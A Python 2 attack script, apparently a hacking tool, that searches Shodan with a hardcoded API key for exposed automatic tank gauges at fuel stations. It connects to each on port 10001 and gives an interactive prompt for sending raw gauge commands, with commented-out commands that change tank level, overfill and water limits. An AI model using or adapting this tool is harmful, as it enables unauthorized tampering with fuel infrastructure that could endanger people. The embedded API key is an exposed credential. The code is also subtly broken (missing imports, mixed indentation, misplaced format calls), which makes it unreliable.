import shodan, sys, socket
from subprocess import call
os.system('cls' if os.name == 'nt' else 'clear')
a = """

                    AUTOMATIC TANK GAUGE CRAWLER V1
                              (_)(_)
                             /     \
                            /       |
                           /   \  * |
             ________     /    /\__/
     _      /        \   /    /          By Data Group
    / \    /  ____    \_/    /           Twitter: @Gdatateam
   //\ \  /  /    \         /            Tks:sql3t0, t1, thi, lordb, ghosyet
   V  \ \/  /      \       /
       \___/        \_____/

"""
print a
print('RTFM > http://www.chipkin.com/files/liz/576013-635.pdf\n', 'Query(s): Gasolina, Fuel\n')
time.sleep(3)
#call(["rm", "-f", "result.csv", "2&>/dev/null"])
key = '8PyzFw4KR6qo3z0qFUDUdtx1CENf6LlZ'
model = raw_input('[+] Query> ')
print('[+] Crawling {0}...').format(model)

try:
	key = '8PyzFw4KR6qo3z0qFUDUdtx1CENf6LlZ'
	api = shodan.Shodan(key)
	query = model+''.join(sys.argv[1:])
	result = api.search(query)

	for service in result['matches']:
		ips = service['ip_str']
		print('[+] FOUND > {0}').format(ips)
		file = 'result.csv'

		with open(file, 'a') as saver:
			saver.write(ips+'\n')
		print('[+] Saved at result.csv file.')

except Exception as e:
	print('Error {0}').format(e)
	exit()

def main():
	#list = ['[+] I20100 - Mostra os tanques\n', '[+] S621TTGGGGGG - Seta o limite minimo nivel\n', '[+] S622TTGGGGGG - Seta o limite maximo de nivel\n', '[+] S623TTGGGGGG - Limite de Overfill do tanque\n', '[+] S624TTII.t - Limite maximo de agua\n', '[+] I491TT - Diagnostico de falta de energia\n', '[+] IB06SS - Diagnostico do sensor de vapor\n', '[+] IB07SS - PPM\n', '[+] IB35SS - Tipo e serial do smart sensor\n', '[+]']
	#list

	global cox
	cox = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	with open(file, 'r') as f:
		for ip in f:
			serv = ip
			try:
				print('\n[+] Connecting to {0}\nCTRL-C to next target.').format(ip)
				port = 10001
				try:
					cox.connect((serv, port))
					shell()
				except socket.error as e:
					print('[-] Cant connect to {0}. Error {0}.').format(ip, e)
					pass
			except KeyboardInterrupt:
				pass
	###funcoes
def shell():
    while True:
        a = '\x01'
        b = '\x0D'
        mess = (a + raw_input("> " ))
        if len(mess) < 2:
            mess = (a + raw_input("> " ))
        else:
            if 'exit' in mess:
                cox.close()
                print "[!] Conexao Encerrada !"
                exit(1)

        cox.send(mess + b)
		print '\n'
		print(cox.recv(16384))
		print(cox.recv(16384))
if __name__ == '__main__':
	main()
